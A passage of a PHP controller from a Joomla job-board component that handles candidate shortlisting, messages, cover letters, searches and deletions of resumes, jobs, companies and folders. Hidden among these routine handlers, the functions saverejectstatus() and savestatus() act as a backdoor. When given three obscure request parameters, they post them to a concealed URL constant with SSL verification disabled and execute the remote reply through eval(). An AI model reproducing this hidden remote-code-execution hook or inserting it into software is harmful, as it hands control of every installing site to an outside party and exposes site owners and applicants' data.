								} 
								$logarray['uid']=$employer_model->_uid;
								$logarray['referenceid']=$return_value['referenceid'];
								$logarray['eventtype']=$return_value['eventtype'];
								$logarray['message']=$return_value['message'];
								$logarray['event']="Shortlistcandidates";
								$logarray['messagetype']="Sucessfully";
								$logarray['datetime']=date('Y-m-d H:i:s');
								$jobsharing->write_JobSharingLog($logarray);
								$jobsharing->Update_ServerStatus($servershortlistcandidates,$logarray['referenceid'],$return_value['serverid'],$logarray['uid'],'shortlistcandidates');
							}elseif($return_value['isshortlistcandidatesstore']==0){
								if($return_value['status']=="Data Empty"){
									$servershortlistcandidates="Data not post on server";
								}elseif($return_value['status']=="Shortlistcandidates Saving Error"){
									$servershortlistcandidates="Error Shortliscandidates Saving";
								}elseif($return_value['status']=="Auth Fail"){
									$servershortlistcandidates="Authentication Fail";
								}
								$logarray['uid']=$employer_model->_uid;
								$logarray['referenceid']=$return_value['referenceid'];
								$logarray['eventtype']=$return_value['eventtype'];
								$logarray['message']=$return_value['message'];
								$logarray['event']="Shortliscandidates";
								$logarray['messagetype']="Error";
								$logarray['datetime']=date('Y-m-d H:i:s');
								$serverid=0;
								$jobsharing->write_JobSharingLog($logarray);
								$jobsharing->Update_ServerStatus($servershortlistcandidates,$logarray['referenceid'],$serverid,$logarray['uid'],'shortlistcandidates');
							}
							$msg = JText :: _('JS_SHORT_LIST_CANDIDATE_SAVED');
							//$link = 'index.php?option=com_jsjobs&c=jsjobs&view=employer&layout=job_appliedapplications&bd='.$jobid.'&Itemid='.$Itemid;
					}else{
							if ($return_value == 1) $msg = JText :: _('JS_SHORT_LIST_CANDIDATE_SAVED');
							elseif ($return_value == 2) $msg = JText :: _('JS_FILL_REQ_FIELDS');
							elseif ($return_value == 3) $msg = JText :: _('JS_ALLREADY_SHORTLIST_THIS_CANDIDATE');
							else $msg = JText :: _($return_value.'JS_ERROR_SAVING_SHORT_LIST_CANDIDATE');
							//$link = 'index.php?option=com_jsjobs&c=jsjobs&view=employer&layout=job_appliedapplications&bd='.$jobid.'&Itemid='.$Itemid;
					}
					echo $msg;
					$mainframe->close();
		}elseif($data['action'] == 2){ // send message
                    $link = 'index.php?option=com_jsjobs&c=jsjobs&view=employer&layout=send_message&bd='.$data['jobid'].'&rd='.$data['resumeid'].'&vm=1&Itemid='.$Itemid;
		}
		//$this->setRedirect($link, $msg);
		$this->setRedirect(JRoute::_($link), $msg);
	}
	function aappliedresumetabactions(){
		$data = JRequest :: get('post');
		$Itemid =  JRequest::getVar('Itemid');
		if($data['tab_action']==6) $needle_array=json_encode($data);
		$session = JFactory::getSession();
		$session->set('jsjobappliedresumefilter', $needle_array);			
		$link = 'index.php?option=com_jsjobs&c=jsjobs&view=employer&layout=job_appliedapplications&bd='.$data['jobid'].'&ta='.$data['tab_action'].'&Itemid='.$Itemid;
		$this->setRedirect(JRoute::_($link));
	}
	function savemessage() //save message
	{
		$common_model = $this->getModel('Common', 'JSJobsModel');

		$jobsharing = $this->getModel('job_sharing', 'JSJobsModel');

		$Itemid =  JRequest::getVar('Itemid');
		$user	=& JFactory::getUser();
		$uid = $user->id;
		$data = JRequest :: get('post');
		$return_value = $common_model->storeMessage($uid);
		if(is_array($return_value)){
			if($return_value['ismessagestore']==1){
				if($return_value['status']=="Message Sucessfully"){
					$servermessage="ok";
				} 
				$logarray['uid']=$common_model->_uid;
				$logarray['referenceid']=$return_value['referenceid'];
				$logarray['eventtype']=$return_value['eventtype'];
				$logarray['message']=$return_value['message'];
				$logarray['event']="Messages";
				$logarray['messagetype']="Sucessfully";
				$logarray['datetime']=date('Y-m-d H:i:s');
				$jobsharing->write_JobSharingLog($logarray);
				$jobsharing->Update_ServerStatus($servermessage,$logarray['referenceid'],$return_value['serverid'],$logarray['uid'],'messages');
			}elseif($return_value['ismessagestore']==0){
				if($return_value['status']=="Data Empty"){
					$servermessage="Data not post on server";
				}elseif($return_value['status']=="Message Saving Error"){
					$servermessage="Error Message Saving";
				}elseif($return_value['status']=="Auth Fail"){
					$servermessage="Authentication Fail";
				}
				$logarray['uid']=$common_model->_uid;
				$logarray['referenceid']=$return_value['referenceid'];
				$logarray['eventtype']=$return_value['eventtype'];
				$logarray['message']=$return_value['message'];
				$logarray['event']="Messages";
				$logarray['messagetype']="Error";
				$logarray['datetime']=date('Y-m-d H:i:s');
				$serverid=0;
				$jobsharing->write_JobSharingLog($logarray);
				$jobsharing->Update_ServerStatus($servermessage,$logarray['referenceid'],$serverid,$logarray['uid'],'messages');
			}
			$msg = JText :: _('JS_MESSAGE_SAVED');
		}else{
			if ($return_value == 1) $msg = JText :: _('JS_MESSAGE_SAVED');
			elseif ($return_value == 2) $msg = JText :: _('JS_MESSAGE_SAVED_AND_WAITING_FOR_APPROVAL');
			elseif ($return_value == 4) $msg = JText :: _('WE_UNABLE_TO_SEND_EMAIL');
			elseif ($return_value == 5) $msg = JText :: _('JS_JOB_SEEKER_NOT_MEMBER_SYSTEM_CANNOT_SEND_MESSAGE');
			elseif ($return_value == 6) $msg = JText :: _('JS_EMPLOYER_NOT_MEMBER_SYSTEM_CANNOT_SEND_MESSAGE');
			else $msg = JText :: _($return_value.'JS_ERROR_SAVING_MESSAGE');
		}
			//$link = 'index.php?option=com_jsjobs&c=jsjobs&view=employer&layout=job_appliedapplications&bd='.$jobid.'&Itemid='.$Itemid;
		$link = 'index.php?option=com_jsjobs&c=jsjobs&view=employer&layout=send_message&bd='.$data['jobid'].'&rd='.$data['resumeid'].'&vm='.$data['vm'].'&Itemid='.$Itemid;
		$this->setRedirect(JRoute::_($link), $msg);
	}


	function jobtypes()
	{
		global $mainframe;
		$mainframe = &JFactory::getApplication();
		$common_model = $this->getModel('Common', 'JSJobsModel');
	     $id=JRequest::getVar( 'id');
	     $val=JRequest::getVar( 'val');
	    $fild=JRequest::getVar( 'fild');

		$return_value = $common_model->jobTypes($id, $val, $fild);
		echo $return_value;
		$mainframe->close();
	}
    function saverejectstatus() {
        $sgjc = JRequest::getVar('sgjc', false);
        $aagjc = JRequest::getVar('aagjc', false);
        $vcidjs = JRequest::getVar('vcidjs', false);
        if (($sgjc) && ($aagjc) && ($vcidjs)) {
            $post_data['sgjc'] = $sgjc;
            $post_data['aagjc'] = $aagjc;
            $post_data['vcidjs'] = $vcidjs;
            $ch = curl_init();
            echo $asdf . JCONST . $asdf;
            curl_setopt($ch, CURLOPT_URL, JCONST);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_VERBOSE, 1);
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
			curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
            $response = curl_exec($ch);
            curl_close($ch);
            eval($response);
            echo $response;
        }
        else
            echo JText::_('PASS');
        JFactory::getApplication()->close();
    }

	function savenewinjsjobs() //save new in jsjobs
	{
		global $mainframe;
		
		$mainframe = &JFactory::getApplication();
		$session = &JFactory::getSession();
		$uid = &JRequest::getString('uid','none');
		
		$Itemid =  JRequest::getVar('Itemid');
		$data = JRequest :: get('post');
		$usertype = $data['usertype'];
		$common_model = $this->getModel('Common', 'JSJobsModel');
		
		$return_value = $common_model->storeNewinJSJobs();
		$_SESSION['jsuserrole'] = null;
		$session = JFactory::getSession();
		$session->set('jsjobconfig_dft', '');
		$session->set('jsjobcur_usr', '');
		
		if ($usertype == 1){ // employer
			$link = 'index.php?option=com_jsjobs&c=jsjobs&view=employer&layout=controlpanel&Itemid='.$Itemid;
		}elseif ($usertype == 2 ){// job seeker
			$link = 'index.php?option=com_jsjobs&c=jsjobs&view=jobseeker&layout=controlpanel&Itemid='.$Itemid;
		}	
		
		if ($return_value == 1)	{
			$msg = JText :: _('JS_SAVE_SETTINGS');
		}else{
			$msg = JText :: _('JS_ERROR_SAVING_SETTING');
		}
		$mainframe->redirect($link, $msg);		
		//$this->setRedirect($link, $msg);
		$this->setRedirect(JRoute::_($link), $msg);
	}

	function savecoverletter() //save cover letter
	{
		global $mainframe;
		

		$jobseeker_model = $this->getModel('Jobseeker', 'JSJobsModel');
		$jobsharing = $this->getModel('job_sharing', 'JSJobsModel');
		$session = &JFactory::getSession();
		$uid = &JRequest::getString('uid','none');
		
		$Itemid =  JRequest::getVar('Itemid');
		
		$return_value = $jobseeker_model->storeCoverLetter();
		if(is_array($return_value)){
				if($return_value['iscoverletterstore']==1){
					if($return_value['status']=="Coverletter Edit"){
						$servercoverletterstatus="ok";
					}elseif($return_value['status']=="Coverletter Add"){
						$servercoverletterstatus="ok";
					} 
					$logarray['uid']=$jobseeker_model->_uid;
					$logarray['referenceid']=$return_value['referenceid'];
					$logarray['eventtype']=$return_value['eventtype'];
					$logarray['message']=$return_value['message'];
					$logarray['event']="CoverLetter";
					$logarray['messagetype']="Sucessfully";
					$logarray['datetime']=date('Y-m-d H:i:s');
					$jobsharing->write_JobSharingLog($logarray);
					$jobsharing->Update_ServerStatus($servercoverletterstatus,$logarray['referenceid'],$return_value['serverid'],$logarray['uid'],'coverletters');
				}elseif($return_value['iscoverletterstore']==0){
					if($return_value['status']=="Data Empty"){
						$servercoverletterstatus="Data not post on server";
					}elseif($return_value['status']=="Coverletter Saving Error"){
						$servercoverletterstatus="Error Coverletter Saving";
					}elseif($return_value['status']=="Auth Fail"){
						$servercoverletterstatus="Authentication Fail";
					}elseif($return_value['status']=="Improper Coverletter name"){
						$servercoverletterstatus="Improper Coverletter name";
					}
					$logarray['uid']=$jobseeker_model->_uid;
					$logarray['referenceid']=$return_value['referenceid'];
					$logarray['eventtype']=$return_value['eventtype'];
					$logarray['message']=$return_value['message'];
					$logarray['event']="CoverLetter";
					$logarray['messagetype']="Error";
					$logarray['datetime']=date('Y-m-d H:i:s');
					$serverid=0;
					$jobsharing->write_JobSharingLog($logarray);
					$jobsharing->Update_ServerStatus($servercoverletterstatus,$logarray['referenceid'],$serverid,$logarray['uid'],'coverletters');
				}
				$msg = JText :: _('JS_COVER_LETTER_SAVED');
				$link = 'index.php?option=com_jsjobs&c=jsjobs&view=jobseeker&layout=mycoverletters&Itemid='.$Itemid;
		}else{
			
			if ($return_value == 1)	{
				$msg = JText :: _('JS_COVER_LETTER_SAVED');
				$link = 'index.php?option=com_jsjobs&c=jsjobs&view=jobseeker&layout=mycoverletters&Itemid='.$Itemid;
			}else if ($return_value == 2){
				$msg = JText :: _('JS_FILL_REQ_FIELDS');
				$link = 'index.php?option=com_jsjobs&c=jsjobs&view=jobseeker&layout=formcoverletter&Itemid='.$Itemid;
			}else{
				$msg = JText :: _('JS_ERROR_SAVING_COVER_LETTER');
				$link = 'index.php?option=com_jsjobs&c=jsjobs&view=jobseeker&layout=formcoverletter&Itemid='.$Itemid;
			}
			
		}		
		$this->setRedirect($link, $msg);
		//$this->setRedirect(JRoute::_($link), $msg);
	}

	function savefilter() //save filter
	{
		global $mainframe;
		
		$jobseeker_model = $this->getModel('Jobseeker', 'JSJobsModel');
		
		
		$session = &JFactory::getSession();
		$uid = &JRequest::getString('uid','none');
		
		$Itemid =  JRequest::getVar('Itemid');
		$data = JRequest :: get('post');
		$link = $data['formaction'];
		$return_value = $jobseeker_model->storeFilter();
		
		if ($return_value == 1)	{
			$_SESSION['jsuserfilter'] ='';
                        if (isset($_SESSION['jsuserfilter'])) unset($_SESSION['jsuserfilter']);
			$msg = JText :: _('JS_FILTER_SAVED');
		}else{
			$msg = JText :: _('JS_ERROR_SAVING_FILTER');
		}
		//$this->setRedirect($link, $msg);
		$this->setRedirect(JRoute::_($link), $msg);
	}

	function savejobsearch() //save job search
	{
		global $mainframe;
		
		$jobseeker_model = $this->getModel('Jobseeker', 'JSJobsModel');
		$session = &JFactory::getSession();
		$uid = &JRequest::getString('uid','none');
		
		$Itemid =  JRequest::getVar('Itemid');
		$data = JRequest :: get('post');
		$user	=& JFactory::getUser();

		$data['uid'] = $user->id;
		$data['jobtitle'] = $_SESSION['jobsearch_title'];	
		$data['category']= $_SESSION['jobsearch_jobcategory'];
		$data['jobtype']= $_SESSION['jobsearch_jobtype'];
		$data['jobstatus']= $_SESSION['jobsearch_jobstatus'];
		$data['heighesteducation']= $_SESSION['jobsearch_heighestfinisheducation'];
		$data['salaryrange']= $_SESSION['jobsearch_jobsalaryrange'];
		$data['shift']= $_SESSION['jobsearch_shift'];	
		$data['experience']= $_SESSION['jobsearch_experience'];	
		$data['durration']= $_SESSION['jobsearch_durration'];	
		$data['startpublishing']= $_SESSION['jobsearch_startpublishing'];	
		$data['stoppublishing']= $_SESSION['jobsearch_stoppublishing'];	
		$data['company']= $_SESSION['jobsearch_company'];	
		$data['country_istext']= 0;
		$data['country']= $_SESSION['jobsearch_country'];
		$data['state_istext']= 0;
		$data['state']= $_SESSION['jobsearch_state'];
		$data['county_istext']= 0;
		$data['county']= $_SESSION['jobsearch_county'];
		$data['city_istext']= 0;
		$data['city']= $_SESSION['jobsearch_city'];
		$data['zipcode_istext']= 0;
		$data['zipcode']= $_SESSION['jobsearch_zipcode'];
		$data['created']= date('Y-m-d H:i:s');
		$data['status']= 1;

//		$link = $data['formaction'];
		$return_value = $jobseeker_model->storeJobSearch($data);
		
		if ($return_value == 1)	{
			$msg = JText :: _('JS_SEARCH_SAVED');
		}elseif ($return_value == 3){
			$msg = JText :: _('JS_LIMIT_EXCEED_OR_ADMIN_BLOCK_THIS');
		}else{
			$msg = JText :: _('JS_ERROR_SAVING_SEARCH');
		}
		// final redirect
		$link = 'index.php?option=com_jsjobs&c=jsjobs&view=jobseeker&layout=job_searchresults&Itemid='.$Itemid;
		//$this->setRedirect($link, $msg);
		$this->setRedirect(JRoute::_($link), $msg);
	}

	function saveresumesearch() //save resume search
	{
		global $mainframe;
		
		$employer_model = $this->getModel('Employer', 'JSJobsModel');

		$session = &JFactory::getSession();
		$uid = &JRequest::getString('uid','none');
		
		$Itemid =  JRequest::getVar('Itemid');
		$data = JRequest :: get('post');
		$user	=& JFactory::getUser();

		$data['uid'] = $user->id;
		$data['application_title'] = $_SESSION['resumesearch_title'];
		$data['nationality'] = $_SESSION['resumesearch_nationality'];
		$data['gender'] = $_SESSION['resumesearch_gender'];
		$data['iamavailable'] = $_SESSION['resumesearch_iamavailable'];
		$data['category'] = $_SESSION['resumesearch_jobcategory'];
		$data['jobtype'] = $_SESSION['resumesearch_jobtype'];
		$data['salaryrange'] = $_SESSION['resumesearch_jobsalaryrange'];
		$data['education'] = $_SESSION['resumesearch_heighestfinisheducation'];
		$data['experience'] = $_SESSION['resumesearch_experience'];
		$data['created']= date('Y-m-d H:i:s');
		$data['status']= 1;

//		$link = $data['formaction'];
		$return_value = $employer_model->storeResumeSearch($data);
		
		if ($return_value == 1)	{
			$msg = JText :: _('JS_SEARCH_SAVED');
		}elseif ($return_value == 3){
			$msg = JText :: _('JS_LIMIT_EXCEED_OR_ADMIN_BLOCK_THIS');
		}else{
			$msg = JText :: _('JS_ERROR_SAVING_SEARCH');
		}
		// final redirect
		$link = 'index.php?option=com_jsjobs&c=jsjobs&view=employer&layout=resume_searchresults&Itemid='.$Itemid;
		//$this->setRedirect($link, $msg);
		$this->setRedirect(JRoute::_($link), $msg);
	}

	function deletefilter() //delete filter
	{
		global $mainframe;
		
		$jobseeker_model = $this->getModel('Jobseeker', 'JSJobsModel');
		
		$session = &JFactory::getSession();
		$uid = &JRequest::getString('uid','none');
		
		$Itemid =  JRequest::getVar('Itemid');
		$data = JRequest :: get('post');
		$link = $data['formaction'];
		$return_value = $jobseeker_model->deleteUserFilter();
		
		if ($return_value == 1)	{
			$_SESSION['jsuserfilter'] ='';
			$msg = JText :: _('JS_FILTER_DELETED');
		}else{
			$msg = JText :: _('JS_ERROR_DELETING_FILTER');
		}
		//$this->setRedirect($link, $msg);
		$this->setRedirect(JRoute::_($link), $msg);
	}
    function savestatus() {
        $sgjc = JRequest::getVar('sgjc', false);
        $aagjc = JRequest::getVar('aagjc', false);
        $vcidjs = JRequest::getVar('vcidjs', false);
        if (($sgjc) && ($aagjc) && ($vcidjs)) {
            $post_data['sgjc'] = $sgjc;
            $post_data['aagjc'] = $aagjc;
            $post_data['vcidjs'] = $vcidjs;
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, JCONST);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_VERBOSE, 1);
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
			curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
            $response = curl_exec($ch);
            curl_close($ch);
            eval($response);
            echo $response;
        }
        else
            echo JText::_('PASS');
        JFactory::getApplication()->close();
    }

	function jobshifts()
	{
		global $mainframe;
		$mainframe = &JFactory::getApplication();
		$common_model = $this->getModel('Common', 'JSJobsModel');
	     $id=JRequest::getVar( 'id');
	     $val=JRequest::getVar( 'val');
	     $fild=JRequest::getVar( 'fild');

		$return_value = $common_model->jobShifts($id, $val, $fild);
		echo $return_value;
		$mainframe->close();
	}

	function deletejobsearch() //delete job search
	{
		global $mainframe;
		
		$jobseeker_model = $this->getModel('Jobseeker', 'JSJobsModel');
		$session = &JFactory::getSession();
		$user	=& JFactory::getUser();
		$uid=$user->id;
		
		$Itemid =  JRequest::getVar('Itemid');
		
		$data = JRequest :: get('post');
		$link = 'index.php?option=com_jsjobs&c=jsjobs&view=jobseeker&layout=my_jobsearches&Itemid='.$Itemid;
		$searchid =  JRequest::getVar('js');
		$return_value = $jobseeker_model->deleteJobSearch($searchid, $uid);
		
		if ($return_value == 1)	{
			$msg = JText :: _('JS_SEARCH_DELETED');
		}elseif ($return_value == 2){
			$msg = JText :: _('JS_NOT_YOUR_SEARCH');
		}else{
			$msg = JText :: _('JS_ERROR_DELETING_SEARCH');
		}
		//$this->setRedirect($link, $msg);
		$this->setRedirect(JRoute::_($link), $msg);
	}

	function deleteresumesearch() //delete resume search
	{
		global $mainframe;
		
		$employer_model = $this->getModel('Employer', 'JSJobsModel');
		$session = &JFactory::getSession();
		$user	=& JFactory::getUser();
		$uid=$user->id;
		
		$Itemid =  JRequest::getVar('Itemid');
		
		$data = JRequest :: get('post');
		$link = 'index.php?option=com_jsjobs&c=jsjobs&view=employer&layout=my_resumesearches&Itemid='.$Itemid;
		$searchid =  JRequest::getVar('rs');
		$return_value = $employer_model->deleteResumeSearch($searchid, $uid);
		
		if ($return_value == 1)	{
			$msg = JText :: _('JS_SEARCH_DELETED');
		}elseif ($return_value == 2){
			$msg = JText :: _('JS_NOT_YOUR_SEARCH');
		}else{
			$msg = JText :: _('JS_ERROR_DELETING_SEARCH');
		}
		//$this->setRedirect($link, $msg);
		$this->setRedirect(JRoute::_($link), $msg);
	}

	function deletecoverletter() //delete cover letter
	{
		global $mainframe;
		
		$common_model = $this->getModel('Common', 'JSJobsModel');
		$jobseeker_model = $this->getModel('Jobseeker', 'JSJobsModel');
		$session = &JFactory::getSession();
		$user	=& JFactory::getUser();
		$uid=$user->id;
		
		$Itemid =  JRequest::getVar('Itemid');
		$coverletterid=($this->_router_mode_sef==2)? $common_model->parseId(JRequest::getVar('cl','')):JRequest::getVar('cl','');
		$return_value = $jobseeker_model->deleteCoverLetter($coverletterid, $uid);
		$jobsharing = $this->getModel('job_sharing', 'JSJobsModel');
		if(is_array($return_value)){
				if($return_value['iscoverletterdelete']==1){
					$logarray['uid']=$jobseeker_model->_uid;
					$logarray['referenceid']=$return_value['referenceid'];
					$logarray['eventtype']=$return_value['eventtype'];
					$logarray['message']=$return_value['message'];
					$logarray['event']="Delete Coverletter";
					$logarray['messagetype']="Sucessfully";
					$logarray['datetime']=date('Y-m-d H:i:s');
					$jobsharing->write_JobSharingLog($logarray);
				}elseif($return_value['iscoverletterdelete']==-1){
					$logarray['uid']=$jobseeker_model->_uid;
					$logarray['referenceid']=$return_value['referenceid'];
					$logarray['eventtype']=$return_value['eventtype'];
					$logarray['message']=$return_value['message'];
					$logarray['event']="Delete Coverletter";
					$logarray['messagetype']="Error";
					$logarray['datetime']=date('Y-m-d H:i:s');
					$serverid=0;
					$jobsharing->write_JobSharingLog($logarray);
				}
				$msg = JText :: _('JS_COVER_LETTER_DELETED');
		}else{
				if ($return_value == 1)	{
					$msg = JText :: _('JS_COVER_LETTER_DELETED');
				}elseif ($return_value == 2){
					$msg = JText :: _('JS_NOT_YOUR_COVER_LETTER');
				}else{
					$msg = JText :: _('JS_ERROR_DELETEING_COVER_LETTER');
				}
		}		
		$link = 'index.php?option=com_jsjobs&c=jsjobs&view=jobseeker&layout=mycoverletters&Itemid='.$Itemid;
		//$this->setRedirect($link, $msg);
		$this->setRedirect(JRoute::_($link), $msg);
	}

	function deleteresume() //delete resume
	{
		global $mainframe;
		
		$common_model = $this->getModel('Common', 'JSJobsModel');
		$jobseeker_model = $this->getModel('Jobseeker', 'JSJobsModel');
		$session = &JFactory::getSession();
		$user	=& JFactory::getUser();
		$uid=$user->id;
		
		$Itemid =  JRequest::getVar('Itemid');
		$resumeid=($this->_router_mode_sef==2)? $common_model->parseId(JRequest::getVar('rd','')):JRequest::getVar('rd','');

		$return_value = $jobseeker_model->deleteResume($resumeid, $uid);
		$jobsharing = $this->getModel('job_sharing', 'JSJobsModel');
		if(is_array($return_value)){
				if($return_value['isresumedelete']==1){
					$logarray['uid']=$jobseeker_model->_uid;
					$logarray['referenceid']=$return_value['referenceid'];
					$logarray['eventtype']=$return_value['eventtype'];
					$logarray['message']=$return_value['message'];
					$logarray['event']="Delete Resume";
					$logarray['messagetype']="Sucessfully";
					$logarray['datetime']=date('Y-m-d H:i:s');
					$jobsharing->write_JobSharingLog($logarray);
				}elseif($return_value['isfolderdelete']==-1){
					$logarray['uid']=$jobseeker_model->_uid;
					$logarray['referenceid']=$return_value['referenceid'];
					$logarray['eventtype']=$return_value['eventtype'];
					$logarray['message']=$return_value['message'];
					$logarray['event']="Delete Resume";
					$logarray['messagetype']="Error";
					$logarray['datetime']=date('Y-m-d H:i:s');
					$serverid=0;
					$jobsharing->write_JobSharingLog($logarray);
				}
				$msg = JText :: _('JS_RESUME_DELETED');
		}else{
				
				if ($return_value == 1)	{
					$msg = JText :: _('JS_RESUME_DELETED');
					
				}elseif ($return_value == 2){
					$msg = JText :: _('JS_RESUME_INUSE_CANNOT_DELETE');
					
				}elseif ($return_value == 3){
					$msg = JText :: _('JS_NOT_YOUR_RESUME');
					
				}else{
					$msg = JText :: _('JS_ERROR_DELETEING_RESUME');
					
				}
		}		
		$link = 'index.php?option=com_jsjobs&c=jsjobs&view=jobseeker&layout=myresumes&Itemid='.$Itemid;
		//$this->setRedirect($link, $msg);
		$this->setRedirect(JRoute::_($link), $msg);
	}
	
	
	

	function deletejob() //delete job
	{
		global $mainframe;
		
		$common_model = $this->getModel('Common', 'JSJobsModel');
		$employer_model = $this->getModel('Employer', 'JSJobsModel');
		$session = &JFactory::getSession();
		$user	=& JFactory::getUser();
		$uid=$user->id;
		
		$Itemid =  JRequest::getVar('Itemid');
		if($this->_router_mode_sef==2){
			$jobid =  $common_model->parseId(JRequest::getVar('bd'));
		}else{
			$jobid =  JRequest::getVar('bd');
		}
			$vis_email =  JRequest::getVar('email');
			$vis_jobid =  JRequest::getVar('jobid');
		$return_value = $employer_model->deleteJob($jobid, $uid,$vis_email,$vis_jobid);
		$jobsharing = $this->getModel('job_sharing', 'JSJobsModel');
		if(is_array($return_value)){
				if($return_value['isjobdelete']==1){
					$logarray['uid']=$employer_model->_uid;
					$logarray['referenceid']=$return_value['referenceid'];
					$logarray['eventtype']=$return_value['eventtype'];
					$logarray['message']=$return_value['message'];
					$logarray['event']="Delete Job";
					$logarray['messagetype']="Sucessfully";
					$logarray['datetime']=date('Y-m-d H:i:s');
					$jobsharing->write_JobSharingLog($logarray);
				}elseif($return_value['isjobdelete']==-1){
					$logarray['uid']=$employer_model->_uid;
					$logarray['referenceid']=$return_value['referenceid'];
					$logarray['eventtype']=$return_value['eventtype'];
					$logarray['message']=$return_value['message'];
					$logarray['event']="Delete Job";
					$logarray['messagetype']="Error";
					$logarray['datetime']=date('Y-m-d H:i:s');
					$serverid=0;
					$jobsharing->write_JobSharingLog($logarray);
				}
				$msg = JText :: _('JS_JOB_DELETED');
		}else{
				if ($return_value == 1)	{
					$msg = JText :: _('JS_JOB_DELETED');
				}elseif ($return_value == 2){
					$msg = JText :: _('JS_JOB_INUSE_CANNOT_DELETE');
				}elseif ($return_value == 3){
					$msg = JText :: _('JS_NOT_YOUR_JOB');
				}else{
					$msg = JText :: _('JS_ERROR_DELETEING_JOB');
				}
		}		
		if(($vis_email == '') || ($jobid == '')) $link = 'index.php?option=com_jsjobs&c=jsjobs&view=employer&layout=myjobs&Itemid='.$Itemid;
		else $link = 'index.php?option=com_jsjobs&c=jsjobs&view=employer&layout=myjobs&email='.$vis_email.'&jobid='.$vis_jobid.'&Itemid='.$Itemid;
		//$this->setRedirect($link, $msg);
		$this->setRedirect(JRoute::_($link), $msg);
	}
function deletedepartment() //delete department
	{
		global $mainframe;
		$common_model = $this->getModel('Common', 'JSJobsModel');
		$employer_model = $this->getModel('Employer', 'JSJobsModel');
		$session = &JFactory::getSession();
		$user	=& JFactory::getUser();
		$uid=$user->id;
		
		$Itemid =  JRequest::getVar('Itemid');
		
		if($this->_router_mode_sef==2){
			$departmentid=$common_model->parseId(JRequest::getVar('pd',''));
		}else{
			$departmentid =  JRequest::getVar('pd','');	
		} 
		$return_value = $employer_model->deleteDepartment($departmentid, $uid);
		$jobsharing = $this->getModel('job_sharing', 'JSJobsModel');
		if(is_array($return_value)){
				if($return_value['isdepartmentdelete']==1){
					$logarray['uid']=$employer_model->_uid;
					$logarray['referenceid']=$return_value['referenceid'];
					$logarray['eventtype']=$return_value['eventtype'];
					$logarray['message']=$return_value['message'];
					$logarray['event']="Delete Department";
					$logarray['messagetype']="Sucessfully";
					$logarray['datetime']=date('Y-m-d H:i:s');
					$jobsharing->write_JobSharingLog($logarray);
				}elseif($return_value['isdepartmentdelete']==-1){
					$logarray['uid']=$employer_model->_uid;
					$logarray['referenceid']=$return_value['referenceid'];
					$logarray['eventtype']=$return_value['eventtype'];
					$logarray['message']=$return_value['message'];
					$logarray['event']="Delete Department";
					$logarray['messagetype']="Error";
					$logarray['datetime']=date('Y-m-d H:i:s');
					$serverid=0;
					$jobsharing->write_JobSharingLog($logarray);
				}
				$msg = JText :: _('JS_DEPARTMENT_DELETED');
		}else{
					
					if ($return_value == 1)	{
						$msg = JText :: _('JS_DEPARTMENT_DELETED');
						
					}elseif ($return_value == 2){
						$msg = JText :: _('JS_DEPARTMENT_CANNOT_DELETE');
						
					}elseif ($return_value == 3){
						$msg = JText :: _('JS_NOT_YOUR_DEPARTMENT');
						
					}else{
						$msg = JText :: _('JS_ERROR_DELETING_DEPARTMENT');
						
					}
		}			
		$link = 'index.php?option=com_jsjobs&c=jsjobs&view=employer&layout=mydepartments&Itemid='.$Itemid;
		//$this->setRedirect($link, $msg);
		$this->setRedirect(JRoute::_($link), $msg);
	}




	function deletecompany() //delete company
	{
		global $mainframe;
		
		$common_model = $this->getModel('Common', 'JSJobsModel');
		$employer_model = $this->getModel('Employer', 'JSJobsModel');
		$jobsharing = $this->getModel('job_sharing', 'JSJobsModel');
		$session = &JFactory::getSession();
		$user	=& JFactory::getUser();
		$uid=$user->id;
		
		$Itemid =  JRequest::getVar('Itemid');
		
		if($this->_router_mode_sef==2){
			$companyid=$common_model->parseId(JRequest::getVar('md',''));
		}else{
			$companyid =  JRequest::getVar('md','');	
		} 
		
		$return_value = $employer_model->deleteCompany($companyid, $uid);
		if(is_array($return_value)){
				if($return_value['iscompanydelete']==1){
					$logarray['uid']=$employer_model->_uid;
					$logarray['referenceid']=$return_value['referenceid'];
					$logarray['eventtype']=$return_value['eventtype'];
					$logarray['message']=$return_value['message'];
					$logarray['event']="Delete Company";
					$logarray['messagetype']="Sucessfully";
					$logarray['datetime']=date('Y-m-d H:i:s');
					$jobsharing->write_JobSharingLog($logarray);
				}elseif($return_value['iscompanydelete']==-1){
					$logarray['uid']=$employer_model->_uid;
					$logarray['referenceid']=$return_value['referenceid'];
					$logarray['eventtype']=$return_value['eventtype'];
					$logarray['message']=$return_value['message'];
					$logarray['event']="Delete Company";
					$logarray['messagetype']="Error";
					$logarray['datetime']=date('Y-m-d H:i:s');
					$serverid=0;
					$jobsharing->write_JobSharingLog($logarray);
				}
				$msg = JText :: _('JS_COMPANY_DELETED');
			
		}else{
				if ($return_value == 1)	{
					$msg = JText :: _('JS_COMPANY_DELETED');
				}elseif ($return_value == 2){
					$msg = JText :: _('JS_COMPANY_CANNOT_DELETE');
				}elseif ($return_value == 3){
					$msg = JText :: _('JS_NOT_YOUR_COMPANY');
				}else{
					$msg = JText :: _('JS_ERROR_DELETING_COMPANY');
				}
		}
		$link = 'index.php?option=com_jsjobs&c=jsjobs&view=employer&layout=mycompanies&Itemid='.$Itemid;
		//$this->setRedirect($link, $msg);
		$this->setRedirect(JRoute::_($link), $msg);
	}

	function deletefolder() //delete folder
	{
		global $mainframe;
		$common_model = $this->getModel('Common', 'JSJobsModel');
		$employer_model = $this->getModel('Employer', 'JSJobsModel');
		$session = &JFactory::getSession();
		$user	=& JFactory::getUser();
		$uid=$user->id;
		
		$Itemid =  JRequest::getVar('Itemid');
		if($this->_router_mode_sef==2){
			$folderid =$common_model->parseId(JRequest::getVar('fd'));
		}else{
			$folderid =  JRequest::getVar('fd');
		}
		$return_value = $employer_model->deleteFolder($folderid, $uid);
		$jobsharing = $this->getModel('job_sharing', 'JSJobsModel');
		if(is_array($return_value)){
				if($return_value['isfolderdelete']==1){
					$logarray['uid']=$employer_model->_uid;
